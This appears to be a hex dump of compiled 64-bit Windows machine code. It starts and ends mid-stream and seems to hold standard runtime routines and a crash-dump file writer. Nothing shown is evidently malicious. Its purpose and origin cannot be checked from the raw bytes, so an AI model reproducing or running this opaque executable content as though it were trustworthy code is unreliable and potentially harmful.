6000069C0E80300008BC8FF15CDFD0000488B1F488D0D13930100E80E160000448BC0488D1504910100488BCFFF532084C00F84BAFEFFFF8B1D28A801004C896C242848897C2430488B07488D542428488BCFFF50184533C94533C0418D510133C9FF157EFD0000488944244044896424384C897424284C89642458895C245033C0668984249800000066C78424980000000401488B0741B802000000488D942498000000488BCFFF50104C8B1F488BCF41FF532883CAFF488B4C2458FF150BFD0000904C89742428488B4C2458FF1522FD00004C896C2428488B4C2440FF1512FD0000E909FEFFFFCCCCCCCCCC4053564881EC98020000488B05575E01004833C44889842480020000488BD9488D0DD2270100FF159CFD0000488BF04885C0750883C8FFE983010000488D15CD270100488BC84889AC24B8020000FF158CFD0000488BE84885C07511488BCEFF154BFD000083C8FFE94A0100004C89A424C8020000488D4C24724C89AC24900200004533ED33D241B8060200006644896C2470E8B8330000488D4C2460FF1545FD00000FB74C24680FB7542466440FB7442462440FB75C246C0FB744246A440FB74C246044895C244089442438894C24308954242844894424204C8D0547270100488D1558270100488D4C2470FF1505FF00004C896C2430458D4503488D4C24704533C9BA000000C044896C2428C744242002000000FF15BCFC00004C8BE04883F8FF750E488BCEFF1582FC0000410BC4EB744889BC24C0020000FF15CFFB0000488D7C24504885DB48895C245444896C245C89442450490F44FDFF1597FC00008BD8FF1557FC00004C896C243041B9010000004D8BC48BD3488BC84C896C242848897C2420FFD5498BCCFF1577FB0000488BCEFF1516FC0000488BBC24C0020000B8010000004C8BA424C80200004C8BAC2490020000488BAC24B8020000488B8C24800200004833CCE8910500004881C4980200005E5BC3CCCCCCCCCCCCCC40534883EC20488BD9FF1501FC000085C0740833C04883C4205BC3488BCB4883C4205BE9F8FDFFFFCCCCCCCCCCCCCCCC4883EC38488D0DC5FFFFFFFF1597FB0000FF15A9FB000033D2488BC8FF15B6FD0000FF15D8FA00004533C94533C033D28BC8FF1580FD0000FF15A2FD0000E80DEEFFFF4533DB4C8D0513FBFFFF4533C94C895C242833D233C944895C2420FF158CFB000083CAFF488BC8488905FFAE0100FF1559FA0000488B0DF2AE0100FF1574FA0000B92C010000FF1551FA000033C04883C438C3CCCCCCCCCCCCCCCCCCCC4883EC28488B114883EA1883C8FFF00FC14210FFC885C07F09488B0A488B01FF50084883C428C3CCCCCCCCCCCCCCCCCC48895C24084889742410574883EC208B3D1776010033F6488BD9C741080400000048897110488971188D4E044533C033D2FF15B1F900004889034885C0750BB905400080E8378CFFFFCC897B20C7432400040000C743280004000048897338488B4B3889733089737889B3B80000004885C97415E8670900004889733889733089737889B3B8000000488B742438488BC3488B5C24304883C4205FC3CCCCCCCC48895C2408574883EC20488BF94883C130E83A8EFFFF488B0F4885C97406FF158CFA00004C8B4718488B57108B4F08FF1513F90000488907488B4F384885C9741BE8FA0800004533DB4C895F3844895F3044895F7844899FB8000000488B0F4885C97406FF1546FA0000488B5C24304883C4205FC3CCCCCCCCCCCCCCCCCCCCCCC20000CCCCCCCCCCCCCCCCCCCCCCCCCC48894C2408574883EC3048C7442420FEFFFFFF48895C2448488BD9488D059624010048890133FF48897908488979104889791848897920488979288979304883C13833D2FF15DEF900008BCF85C00F95C185C9750BB905400080E8F18AFFFF90488D4B6033D2FF15BCF900008BCF85C00F95C185C9750BB905400080E8CF8AFFFFCC4889BB88000000488BC3488B5C24484883C4305FC3CCCCCCCCCCCCCCCCCC48894C2408534883EC3048C7442420FEFFFFFF488BD9488D05FB230100488901E8CBD5FFFF90488D4B60FF15F8F7000090488D4B384883C4305B48FF25E7F70000CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC48894C2408574883EC3048C7442420FEFFFFFF48895C24488BDA488BF9488D05A4230100488901E874D5FFFF90488D4F60FF15A1F7000090488D4F38FF1596F70000F6C3017408488BCFE8F5010000488BC7488B5C24484883C4305FC3CCCCCC488B49084C8BC233D248FF25D8F800004883EC284885D2740F488B49084C8BC233D2FF15B8F800004883C428C3CCCCCC4883EC284885D2750D488B01498BD04883C42848FF204D85C0750D488B01FF500833C04883C428C3488B49084D8BC84C8BC233D24883C42848FF2541F90000CC488B49084C8BC233D248FF2538F9000048895C2408574883EC2080791000488D056BFB00008BFA488901488BD9740F488B49084885C97406FF1522F8000040F6C7017408488BCBE828010000488BC3488B5C24304883C4205FC3CCCC488B4908488B0148FF6008CCF0FF4120488D4110C3CCCCCC488BC1C340534883EC20488D0533FB0000488BD9488901F6C2017405E8DF000000488BC34883C4205BC3CCCC48895C2408574883EC208D5A084D63C8488BF983E3F84C63C375054533C0EB1833D24883C8FF49F7F0493BC1723A4D0FAFC14983F8E77730488B4908498D5018488B01FF104C8BD84885C0741B4183630800488938C74010010000008D43FF4189430C498BC3EB0233C0488B5C24304883C4205FC3CCCCCC40534883EC20418D5808418BC183E3F8448BC34C0FAFC0B8FFFFFFFF4C3BC077294183F8E77723488B49084183C0184C8B0941FF51104C8BD84885C0740C8D43FF4189430C498BC3EB0233C04883C4205BC3CCCCE977060000CCCCCCE977050000CCCCCCCCCCCCCCCCCCCCCCCCCC66660F1F840000000000483B0D01570100751148C1C11066F7C1FFFF7502F3C348C1C910E92D100000CCCCCCCCCCCCCC66660F1F8400000000004C8BD9482BD10F829E0100004983F8087261F6C1077436F6C101740B8A040A49FFC8880148FFC1F6C102740F668B040A4983E8026689014883C102F6C104740D8B040A4983E80489014883C1044D8BC849C1E90575514D8BC849C1E9037414488B040A4889014883C10849FFC975F04983E0074D85C07508498BC3C30F1F40008A040A880148FFC149FFC875F3498BC3C3666666666666660F1F840000000000666666906666904981F9002000007342488B040A4C8B540A084883C120488941E04C8951E8488B440AF04C8B540AF849FFC9488941F04C8951F875D44983E01FE971FFFFFF6666660F1F84000000000066904881FA0010000072B5B8200000000F18040A0F18440A404881C180000000FFC875EC4881E900100000B8400000004C8B0C0A4C8B540A084C0FC3094C0FC351084C8B4C0A104C8B540A184C0FC349104C0FC351184C8B4C0A204C8B540A284883C1404C0FC349E04C0FC351E84C8B4C0AF04C8B540AF8FFC84C0FC349F04C0FC351F875AA4981E8001000004981F8001000000F8371FFFFFFF0800C2400E9B9FEFFFF666666660F1F840000000000666666906666669066904903C84983F8087261F6C1077436F6C101740B48FFC98A040A49FFC88801F6C102740F4883E902668B040A4983E802668901F6C104740D4883E9048B040A4983E80489014D8BC849C1E90575504D8BC849C1E90374144883E908488B040A49FFC948890175F04983E0074D85C07507498BC3C30F1F0048FFC98A040A49FFC8880175F3498BC3C3666666666666660F1F840000000000666666906666904981F9002000007342488B440AF84C8B540AF04883E920488941184C895110488B440A084C8B140A49FFC9488941084C891175D54983E01FE973FFFFFF666666660F1F84000000000066904881FA00F0FFFF77B5B8200000004881E9800000000F18040A0F18440A40FFC875EC4881C100100000B8400000004C8B4C0AF84C8B540AF04C0FC349F84C0FC351F04C8B4C0AE84C8B540AE04C0FC349E84C0FC351E04C8B4C0AD84C8B540AD04883E9404C0FC349184C0FC351104C8B4C0A084C8B140AFFC84C0FC349084C0FC31175AA4981E8001000004981F8001000000F8371FFFFFFF0800C2400E9BAFEFFFF48895C2408574883EC20488D05EBF600008BDA488BF9488901E8160E0000F6C3017408488BCFE855FCFFFF488BC7488B5C24304883C4205FC3CCCCCC4883EC28488BC2488D5111488D4811E86C0E000085C00F94C04883C428C3CCCC488D05A9F60000488901488B02C641100048894108488BC1C3CCCCCC4883790800488D0598F60000480F454108C3CCCC4885D2745448895C24084889742410574883EC20488BF9488BCA488BDAE83E0F0000488BF0488D4801E882010000488947084885C07413488D56014C8BC3488BC8E89A0E0000C6471001488B5C2430488B7424384883C4205FC3CCCC40534883EC2080791000488BD97409488B4908E8FC0000004883630800C64310004883C4205BC3CC40534883EC204883610800488D05EAF50000C6411000488901488B12488BD9E858FFFFFF488BC34883C4205BC3CCCCCC48895C2408574883EC20488BFA488BD9483BCA7421E88EFFFFFF807F1000740E488B5708488BCBE820FFFFFFEB08488B470848894308488BC3488B5C24304883C4205FC3488D0581F50000488901E955FFFFFFCC48895C2408574883EC20488D0567F500008BDA488BF9488901E836FFFFFFF6C3017408488BCFE8C1FAFFFF488BC7488B5C24304883C4205FC3CCCCCC40534883EC204883610800488D052AF50000488BD9488901C6411000E84FFFFFFF488BC34883C4205BC3CCCC4885C97437534883EC204C8BC1488B0D4C77010033D2FF1564F1000085C07517E82F030000488BD8FF1512F000008BC8E8D702000089034883C4205BC3CCCCCC48895C24084889742410574883EC20488BD94883F9E0777CBF010000004885C9480F45F9488B0DF57601004885C97520E8C7140000B91E000000E85D120000B9FF000000E8A30E0000488B0DD07601004C8BC733D2FF15EDF00000488BF04885C0752C3905477D0100740E488BCBE8D514000085C0740DEBABE896020000C7000C000000E88B020000C7000C000000488BC6EB12E8AF140000E876020000C7000C00000033C0488B5C2430488B7424384883C4205FC3CCCC40534883EC40488BD9EB0F488BCBE87D14000085C07413488BCBE829FFFFFF4885C074E74883C4405BC38B059870010041B801000000488D1D0BF400004184C07539410BC0488D542458488D0D5F700100890571700100488D05FAF300004889442458E800FDFFFF488D0D55E4000048891D3A700100E885050000488D152E700100488D4C2420E850FEFFFF488D15ED3D0100488D4C242048895C2420E8BE080000CCCC4883EC28E84F1600004885C0740AB916000000E850160000F605654E010002741441B801000000BA15000040418D4802E8F3130000B903000000E881100000CC488BC4488958084889681048897018574883EC50488360C800488BFA33D2498BE8488BD9448D4228488D48D0498BF1E8802500004885FF7515E83A010000C70016000000E88F15000083C8FFEB524885DB74E6488D4C24204C8BCE4C8BC5488BD7C7442428FFFFFF7FC74424384200000048895C243048895C2420E8B81A0000FF4C24288BD8780A488B4C2420C60100EB0C488D54242033C9E8BE1700008BC3488B5C2460488B6C2468488B7424704883C4505FC3CCCCCC4D8BC84533C0E93DFFFFFFCC40534883EC204533D24C8BC94885C9740E4885D274094D85C0751D66448911E890000000BB160000008918E8E41400008BC34883C4205BC3492BC8410FB70066428904014983C0026685C0740548FFCA75E94885D2751066458911E854000000BB22000000EBC233C0EBC7CC4C8D0D1D4D010033C0498BD1448D40083B0A742BFFC04903D083F82D72F28D41ED83F8117706B80D000000C381C144FFFFFFB81600000083F90E410F46C0C34898418B44C104C3CC4883EC28E8232600004885C07509488D052F4E0100EB044883C0104883C428C34883EC28E8032600004885C07509488D05134E0100EB044883C0144883C428C340534883EC208BD9E8DF2500004885C07509488D05EF4D0100EB044883C0148918E8C62500004C8D15D74D01004885C074044C8D50108BCBE83BFFFFFF4189024883C4205BC3CCCC40534883EC208BD9E8972500004885C07408488BC8E8662700008BCBFF156AEE0000CCCC4883EC28E8FB25000090488B8898000000FF90900000008BC8E8BEFFFFFF908BC8E8360E0000904883C428C340534883EC20488BD9E892B70000E8512400008BC8E8422400004C8BD84885C0752CE83D240000488BD38BC8E83B24000085C0750FFF15D9EB00008BC8FF15F9ED0000CCFF15DAEB00008903EB2C488B8390000000488BCB49898390000000488B839800000049898398000000488B430849894308E882250000E855FFFFFFCC48895C240848896C2410488974242057415441554883EC3033DB498BE9498BF0448BE24C8BE94D85C07515E878FEFFFFC70016000000E8CD120000E997000000E8DBB60000BAC8020000B901000000E8702B0000488BF84885C07468E8F7240000488BCF488B90C0000000E8AC230000488B4C247848834F08FF8B4424704885C94C8D4424604C0F45C1498BD44C8BCF4C894424284C8D05E4FEFFFF498BCD4889B7900000004889AF9800000089442420FF15DDEB00004885C0751DFF15D2EA00008BD8488BCFE888FAFFFF85DB74078BCBE811FEFFFF33C0488B5C2450488B6C2458488B7424684883C430415D415C5FC3CCCCE9DFF4FFFFCCCCCC40534883EC20BA080000008D4A18E8B52A0000488BC8488BD8FF15B1EC000048890552B1010048890543B101004885DB75058D4318EB064883230033C04883C4205BC3CC48895C2408488974241048897C24184154415541564883EC204C8BF1E83709000090488B0D0BB10100FF1555EC00004C8BE0488B0DF3B00100FF1545EC0000488BD8493BC40F829B000000488BF8492BFC4C8D6F084983FD080F8287000000498BCCE8312B0000488BF0493BC57355BA00100000483BC2480F42D04803D0483BD07211498BCCE87D2A000033DB4885C0751AEB0233DB488D5620483BD67249498BCCE8612A00004885C0743C48C1FF03488D1CF8488BC8FF15CFEB000048890570B00100498BCEFF15BFEB0000488903488D4B08FF15B2EB00004889054BB00100498BDEEB0233DBE877080000488BC3488B5C2440488B742448488B7C24504883C420415E415D415CC3CCCC4883EC28E8EBFEFFFF48F7D81BC0F7D8FFC84883C428C3CC48895C2408488974241048897C24185541544155488BEC4883EC5033DB4D8BE04C8BE9488BF2488D4DD8448D432833D2498BF948895DD0E8442000004885FF7515E8FEFBFFFFC70016000000E85310000083C8FFEB764D85E474054885F674E14C8B4D484C8B4540B9FFFFFF7F4C3BE1418BC4488BD70F47C1488D4DD0C745E842000000488975E0488975D08945D841FFD58BF84885F6743385C07821FF4DD87808488B45D08818EB10488D55D033C9E87312000083F8FF74048BC7EB0E395DD842885C26FF0F9DC38D43FE4C8D5C2450498B5B20498B7328498B7B30498BE3415D415C5DC3CCCC40534883EC30488BD94D85C074474885C974424885D2743D488B44246048894424284C894C24204D8BC84C8BC2488BD1488D0D2D2A0000E8DCFEFFFF85C07903C6030083F8FE7520E80FFBFFFFC70022000000EB0BE802FBFFFFC70016000000E8570F000083C8FF4883C4305BC3CCCC4883EC384C894C24204533C9E87FFFFFFF4883C438C3CCCC33D2448D420AE965360000CC4C8BC14C8BD14C8BC9410FB7004983C0026685C075F34983E804493BC8731D410FB708410FB71166418909664189104983E8024983C1024D3BC872E3498BC2C348895C2410574883EC30B84D5A0000663905EE66FFFF740433DBEB384863051D67FFFF488D0DDA66FFFF4803C181385045000075E3B90B0200006639481875D833DB83B8840000000E76093998F80000000F95C3895C2440E86F05000085C07522833DA4680100027405E8010C0000B91C000000E897090000B9FF000000E8DD050000E84822000085C07522833D79680100027405E8D60B0000B910000000E86C090000B9FF000000E8B2050000E8F13C000090E8173A000085C0790AB91B000000E8F5080000FF15E7E8000048890598AD0100E86F39000048890524680100E87338000085C0790AB908000000E8C9080000E89035000085C0790AB909000000E8B6080000B901000000E83406000085C074078BC8E8A10800004C8B05A26D01004C8905A36D0100488B157C6D01008B0D6A6D0100E849EBFFFF8BF88944242085DB75078BC8E838080000E84B080000EB178BF8837C24400075088BC8E82D080000CCE843080000908BC7488B5C24484883C4305FC3CC4883EC28E8933C00004883C428E976FEFFFFCCCC48895C241048897C241855488BEC4883EC60488BFA488BD9488D4DC0488D15E5EA000041B840000000E84AF0FFFF488D5510488BCF48895DE848897DF0E8007D00004C8BD848894510488945F84885FF741BF60708B9004099017405894DE0EB0C8B45E04D85DB0F44C18945E0448B45D88B55C48B4DC04C8D4DE0FF15AFE700004C8D5C2460498B5B18498B7B20498BE35DC3CC48894C24084881EC88000000488D0D81670100FF15B3E70000488B056C68010048894424584533C0488D542460488B4C2458E8837C0000488944245048837C245000744148C744243800000000488D4424484889442430488D4424404889442428488D052C67010048894424204C8B4C24504C8B442458488B54246033C9E8317C0000EB22488B842488000000488905F8670100488D8424880000004883C00848890585670100488B05DE6701004889054F660100488B84249000000048890550670100C70526660100090400C0C7052066010001000000488B05DD4501004889442468488B05D94501004889442470FF154EE50000890590660100B901000000E8A23B000033C9FF15FEE40000488D0D9FE90000FF1599E60000833D6A66010000750AB901000000E87A3B0000FF15E0E40000BA090400C0488BC8FF156AE600004881C488000000C3CCCC40534883EC30488BD9B90E000000E85D3D000090488B43084885C0743F488B0DFC6A0100488D15ED6A010048894C24204885C97419483901750F488B410848894208E881F3FFFFEB05488BD1EBDD488B4B08E871F3FFFF4883630800B90E000000E80A3C00004883C4305BC3CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC66660F1F840000000000482BD14C8BCAF6C107741B8A01428A14093AC2755648FFC184C0745748F7C10700000075E69049BB00010101010101814A8D14096681E2FF0F6681FAF80F77CB488B014A8B1409483BC275BF49BAFFFEFEFEFEFEFE7E4C03D24883F0FF4883C1084933C24985C374C7EB0F481BC04883D8FFC333C0C36666669084D2742784F6742348C1EA1084D2741B84F6741748C1EA1084D2740F84F6740BC1EA1084D2740484F6758B33C0C3481BC04883D8FFC340534883EC204885C9740D4885D274084D85C0751C448801E8C7F5FFFFBB160000008918E81B0A00008BC34883C4205BC34C8BC94D2BC8418A004388040149FFC084C0740548FFCA75ED4885D2750E8811E88EF5FFFFBB22000000EBC533C0EBCACCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC66660F1F840000000000488BC148F7D948A907000000740F66908A1048FFC084D2745FA80775F349B8FFFEFEFEFEFEFE7E49BB0001010101010181488B104D8BC84883C0084C03CA48F7D24933D14923D374E8488B50F884D2745184F6744748C1EA1084D2743984F6742F48C1EA1084D2742184F67417C1EA1084D2740A84F675B9488D4401FFC3488D4401FEC3488D4401FDC3488D4401FCC3488D4401FBC3488D4401FAC3488D4401F9C3488D4401F8C34883EC284533C0BA0010000033C9C744243002000000FF1554E10000488905A56801004885C07429FF1502E400003C06731A488B0D8F6801004C8D44243041B90400000033D2FF15DCE30000B8010000004883C428C3CCCC40534883EC208BD9488D0DC1E60000FF15CBE300004885C07419488D159FE60000488BC8FF1506E200004885C074048BCBFFD04883C4205BC3CCCCCC40534883EC208BD9E8B7FFFFFF8BCBFF1597E30000CCCCCCB908000000E95A3A0000CCCCB908000000E94E390000CCCC40534883EC20E815190000488BC8488BD8E80E060000488BCBE842060000488BCBE8FA210000488BCBE8463B0000488BCBE842080000488BCB4883C4205BE9113B0000CC483BCA732D48895C2408574883EC20488BFA488BD9488B034885C07402FFD04883C308483BDF72ED488B5C24304883C4205FC3CC48895C2408574883EC2033C0488BFA488BD9483BCA731785C07513488B0B4885C97402FFD14883C308483BDF72E9488B5C24304883C4205FC3CCCCCC48895C2408574883EC2048833D1E0D0100008BD97418488D0D130D0100E85E3B000085C074088BCBFF15020D0100E8953A0000488D1516E40000488D0DE7E30000E87EFFFFFF85C0755A488D0D47360000E892F6FFFF488D1D9BE30000488D3DBCE30000EB0E488B034885C07402FFD04883C308483BDF72ED48833D9FA6010000741F488D0D96A60100E8F13A000085C0740F4533C033C9418D5002FF157EA6010033C0488B5C24304883C4205FC3CC48895C2408488974241044894424185741544155415641574883EC40458BE08BDA448BF9B908000000E8BA38000090833DC2660100010F8401010000C705AE66010001000000448825A366010085DB0F85D4000000488B0D04A60100FF154EE10000488BF048894424304885C00F84A3000000488B0DDEA50100FF1530E10000488BF848894424204C8BF648897424284C8BE848894424384883EF0848897C2420483BFE7270E8111700004839077502EBE6483BFE725F488B0FFF15F0E00000488BD8E8F4160000488907FFD3488B0D8CA50100FF15D6E00000488BD8488B0D74A50100FF15C6E000004C3BF375054C3BE874BC4C8BF348895C2428488BF348895C24304C8BE84889442438488BF84889442420EB9A488D15A3E20000488D0D84E20000E8B7FDFFFF488D15A0E20000488D0D91E20000E8A4FDFFFF904585E4740FB908000000E89C3600004585E47526C7059D65010001000000B908000000E883360000418BCFE8C3FCFFFF418BCFFF15A2E00000CC488B5C2470488B7424784883C440415F415E415D415C5FC3CC4533C033D2E966FEFFFFCCCC4533C0418D5001E958FEFFFF33D233C9448D4201E94BFEFFFFCCCCCCBA0100000033C9448BC2E939FEFFFFCC40534883EC208BD9E8A70200008BCBE8400000004533C0B9FF000000418D5001E813FEFFFFCCCCCC4C8D05E9EB000033C0498BD03B0A740EFFC04883C21083F81672F133C0C348984803C0498B44C008C3CCCCCC48895C241048896C2418488974242057415441554881EC50020000488B05AA3E01004833C448898424400200008BF9E8A0FFFFFF33F6488BD84885C00F84EE0100008D4E03E8AE3C000083F8010F84750100008D4E03E89D3C000085C0750D833D5E3E0100010F845C01000081FFFC0000000F84B8010000488D2D6564010041BC140300004C8D0528ED0000488BCD418BD4E82DEFFFFF33C985C00F85140100004C8D2D6E64010041B80401000066893569660100498BD5FF1556DF0000418D7C24E785C0752A4C8D05B6EC00008BD7498BCDE8ECEEFFFF85C074154533C94533C033D233C94889742420E844030000CC498BCDE8E33B000048FFC04883F83C7647498BCDE8D23B00004C8D056BEC000041B903000000488D4C45BC488BC1492BC548D1F8482BF8488BD7E8DC3A000085C074154533C94533C033D233C94889742420E8EC020000CC4C8D0520EC0000498BD4488BCDE8293A000085C075414C8BC3498BD4488BCDE8173A000085C0751A488D15ACEB000041B810200100488BCDE8F6370000E9A50000004533C94533C033D233C94889742420E895020000CC4533C94533C033D233C94889742420E880020000CC4533C94533C033D24889742420E86D020000CCB9F4FFFFFFFF1539DE0000488BF84885C074554883F8FF744F8BD64C8D4424408A0B4188086639337411FFC249FFC04883C30281FAF401000072E5488D4C24404088B42433020000E8FFF8FFFF4C8D4C2430488D542440488BCF4C8BC04889742420FF15D4DD0000488B8C24400200004833CCE884E5FFFF4C8D9C2450020000498B5B28498B6B30498B7338498BE3415D415C5FC3CCCCCC4883EC28B903000000E88A3A000083F8017417B903000000E87B3A000085C0751D833D3C3C0100017514B9FC000000E86CFDFFFFB9FF000000E862FDFFFF4883C428C3CC48890D61680100C340534883EC20488BD9488B0D50680100FF15D2DC00004885C07410488BCBFFD085C07407B801000000EB0233C04883C4205BC3CC48890D35680100C348895C2410488974241855574154488DAC2410FBFFFF4881ECF0050000488B05C03B01004833C4488985E0040000418BF88BF28BD983F9FF7405E8913100008364247000488D4C247433D241B894000000E8761100004C8D5C2470488D4510488D4D104C895C24484889442450FF1581DC00004C8BA508010000488D542440498BCC4533C0E8587100004885C07437488364243800488B542440488D4C246048894C2430488D4C24584C8BC848894C2428488D4D104D8BC448894C242033C9E818710000EB1C488B850805000048898508010000488D8508050000488985A8000000488B850805000089742470897C247448894580FF1571DA000033C98BF8FF152FDA0000488D4C2448FF15CCDB000085C0751085FF750C83FBFF74078BCBE8AC300000488B8DE00400004833CCE8A9E3FFFF4C8D9C24F0050000498B5B28498B7330498BE3415C5F5DC3CC4883EC2841B801000000BA170400C0418D4801E89CFEFFFFFF15D2D90000BA170400C0488BC84883C42848FF2557DB0000CCCCCC48895C240848896C24104889742418574883EC30488BE9488B0D96660100418BD9498BF8488BF2FF15FFDA0000448BCB4C8BC7488BD6488BCD4885C074214C8B5424604C89542420FFD0488B5C2440488B6C2448488B7424504883C4305FC3488B4424604889442420E85EFFFFFFCCCC4883EC384883642420004533C94533C033D233C9E877FFFFFF4883C438C3CCCC48890D2566010048890D2666010048890D2766010048890D28660100C3CCCCCC488B0D1566010048FF256EDA0000CCCC48895C241048897424185741544155415641574883EC308BD933FF897C246033F68BD183EA020F84C500000083EA02746283EA02744D83EA02745883EA03745383EA04742E83EA067416FFCA7435E8FDEAFFFFC70016000000E852FFFFFFEB404C8D259D650100488B0D96650100E98C0000004C8D259A650100488B0D93650100EB7C4C8D2582650100488B0D7B650100EB6CE8E4100000488BF04885C0750883C8FFE972010000488B90A0000000488BCA4C63054FE9000039590474134883C110498BC048C1E0044803C2483BC872E8498BC048C1E0044803C2483BC87305395904740233C94C8D61084D8B2C24EB204C8D2504650100488B0DFD640100BF01000000897C2460FF155ED900004C8BE84983FD01750733C0E9FC0000004D85ED750A418D4D03E82CF9FFFFCC85FF740833C9E86C3000009083FB08741183FB0B740C83FB0474074C8B7C2428EB2C4C8BBEA80000004C897C24284883A6A80000000083FB087513448BB6B0000000C786B00000008C000000EB05448B74246083FB0875398B0D71E800008BD1894C24208B0569E8000003C83BD17D2A4863CA4803C9488B86A0000000488364C80800FFC2895424208B0D40E80000EBD3E8B50E00004989042485FF740733C9E8D22E0000BF080000003BDF750D8B96B00000008BCF41FFD5EB058BCB41FFD53BDF740E83FB0B740983FB040F8518FFFFFF4C89BEA80000003BDF0F8509FFFFFF4489B6B0000000E9FDFEFFFF488B5C2468488B7424704883C430415F415E415D415C5FC3CCCC488BC4488958104889681848897020894808574883EC20488BCA488BDAE83E4200008B4B184863F0F6C1827517E8EAE8FFFFC70009000000834B182083C8FFE934010000F6C140740DE8CEE8FFFFC70022000000EBE233FFF6C1017419897B08F6C1100F8489000000488B431083E1FE488903894B188B4318897B0883E0EF83C802894318A90C010000752FE8BB3F00004883C030483BD8740EE8AD3F00004883C060483BD8750B8BCEE83D3F000085C07508488BCBE8DD3E0000F74318080100000F848D0000008B2B488B53102B6B10488D42014889038B4324FFC889430885ED7E19448BC58BCEE8CA3D00008BF8EB5783C920894B18E93FFFFFFF83FEFF742383FEFE741E488BCE488BC6488D15C499010083E11F48C1F805486BC95848030CC2EB07488D0D7C360100F6410820741733D28BCE448D4202E8353500004883F8FF0F84EFFEFFFF488B4B108A4424308801EB16BD01000000488D5424308BCE448BC5E84F3D00008BF83BFD0F85C5FEFFFF0FB6442430488B5C2438488B6C2440488B7424484883C4205FC3CCCCCC40534883EC20488BD9C64118004885D2757FE8250E000048894310488B90C0000000488913488B88B800000048894B08483B15F145010074168B80C80000008505B34101007508E8F84B0000488903488B05A240010048394308741B488B43108B88C8000000850D8C4101007509E80143000048894308488B4310F680C80000000275148388C800000002C6431801EB070F1002F30F7F01488BC34883C4205BC3CCCCCC488BC44889580848896810488970184889782041544883EC20498BD9498BF08BFA488BE9E8BFE6FFFFF6461840448B20740B48837E10007504013BEB4FE8A6E6FFFF832000EB2F8A4D004C8BC3488BD6FFCFE8FD14000048FFC5833BFF7517E884E6FFFF83382A75114C8BC3488BD6B13FE8DE14000085FF7FCDE869E6FFFF8338007508E85FE6FFFF448920488B5C2430488B6C2438488B742440488B7C24484883C420415CC3CC48895C24185556574154415541564157488DAC2430FEFFFF4881ECD0020000488B056E3401004833C4488985C801000033C0488BD948894C2468488BFA488D4D80498BD04D8BF189442460448BE889442454448BF8894424488944245C89442450E84EFEFFFF4533D24885DB752CE8CDE5FFFFC70016000000E822FAFFFF4533DB44385D98740B488B459083A0C8000000FD83C8FFE9A007000083CEFFF64318404C8D0D1452FFFF0F85A2000000488BCBE8CE3E0000488D150F3401003BC6742883F8FE74234C63C04C8D0DEC51FFFF498BC84183E01F48C1F9054D6BC0584D0384C940450200EB0A4C8BC24C8D0DC951FFFF41F640387F75283BC6741E83F8FE74194863D0488BC283E21F48C1F805486BD258490394C140450200F6423880742BE819E5FFFFC70016000000E86EF9FFFF4533DB44385D98740B488B459083A0C8000000FD8BC6E9ED0600004533D24885FF74CD448A27458BC244895424404489542444418BD24C8955A04584E40F84B1060000488B5DB841BB0002000048FFC748897DB04585C00F8897060000418D4424E03C587712490FBEC4420FBE8C08F090010083E10FEB03418BCA4863C24863C9488D14C8420FBE940A10910100C1FA04895424588BCA85D20F843C070000FFC90F844B080000FFC90F84F3070000FFC90F84B2070000FFC90F84A2070000FFC90F846A070000FFC90F8463060000FFC90F8511060000410FBEC483F8640F8F6B0100000F846B02000083F8410F843101000083F8430F84CE00000083F8450F841F01000083F8470F841601000083F853746C83F8580F84CF01000083F85A741783F8610F840601000083F8630F84A5000000E925040000498B064983C6084885C0742F488B58084885DB74260FBF00410FBAE50B731299C7442450010000002BC2D1F8E9F00300004489542450E9E6030000488B1D00320100E9CF03000041F7C5300800007505410FBAED0B498B1E443BFE418BC7B9FFFFFF7F0F44C14983C60841F7C5100800000F84080100004885DBC744245001000000480F441DC0310100488BCBE9E100000041F7C5300800007505410FBAED0B4983C60841F7C5100800007427450FB74EF8488D55C0488D4C24444D8BC3E8AF4A00004533D285C07419C744245C01000000EB0F418A46F8C7442444010000008845C0488D5DC0E939030000C7442478010000004180C4204183CD40488D5DC0418BF34585FF0F892E02000041BF06000000E96802000083F8650F8C0503000083F8677ED383F8690F84EF00000083F86E0F84B100000083F86F0F849800000083F870746383F8730F8407FFFFFF83F8750F84CA00000083F8780F85C5020000B827000000EB51FFC86644391174084883C10285C075F0482BCB48D1F9EB204885DB480F441DB8300100488BCBEB0AFFC8443811740748FFC185C075F22BCB894C2444E97D02000041BF10000000410FBAED0FB8070000008944246041B9100000004584ED79600451C644244C30418D51F28844244DEB5341B9080000004584ED7944450BEBEB3F498B3E4983C608E8A24700004533D285C00F84DF0500008B44244041F6C5207405668907EB028907C744245C01000000E9590300004183CD4041B90A0000008B542448B8008000004485E874094D8B064983C608EB3A410FBAE50C72F04983C60841F6C52074194C8974247041F6C54074074D0FBF46F8EB1C450FB746F8EB1541F6C54074064D6346F8EB04458B46F84C8974247041F6C540740D4D85C0790849F7D8410FBAED084485E8750A410FBAE50C7203458BC04585FF790841BF01000000EB0B4183E5F7453BFB450F4FFB448B742460498BC0488D9DBF01000048F7D81BC923CA894C2448418BCF41FFCF85C97F054D85C0742033D2498BC04963C948F7F14C8BC08D423083F8397E034103C6880348FFCBEBD14C8B742470488D85BF0100002BC348FFC3894424444585EB0F840701000085C07409803B300F84FA00000048FFCBFF442444C60330E9EB000000750E4180FC67753D41BF01000000EB35453BFB450F4FFB4181FFA30000007E25418DBF5D0100004863CFE8090D0000488945A04885C07407488BD88BF7EB0641BFA3000000498B06488B0DA93101004983C608410FBEFC4863F6488945B8FF1554CF0000488D4D80448BCF48894C24308B4C24784C8BC6894C2428488D4DB8488BD344897C2420FFD0418BFD81E780000000741B4585FF7516488B0D70310100FF1512CF0000488D5580488BCBFFD04180FC67751A85FF7516488B0D48310100FF15F2CE0000488D5580488BCBFFD0803B2D7508410FBAED0848FFC3488BCBE854EAFFFF4533D289442444443954245C0F854601000041F6C5407431410FBAE5087307C644244C2DEB0B41F6C5017410C644244C2BBF01000000897C2448EB1141F6C5027407C644244C20EBE88B7C2448448B642454488B742468442B642444442BE741F6C50C75124C8D4C24404C8BC6418BD4B120E8F50D00004C8D4C2440488D4C244C4C8BC68BD7E845F8FFFF41F6C508741841F6C50475124C8D4C24404C8BC6418BD4B130E8C30D00008B7C244433C039442450746985FF7E65488BF3440FB70E488D95C0010000488D4DA841B806000000FFCF4883C602E8784600004533D285C0752B8B55A885D274244C8B4424684C8D4C2440488D8DC0010000E8D0F7FFFF4533D285FF75B5488B742468EB25488B7424684183C8FF4489442440EB1A4C8D4C24404C8BC68BD7488BCBE8A0F7FFFF4533D2448B44244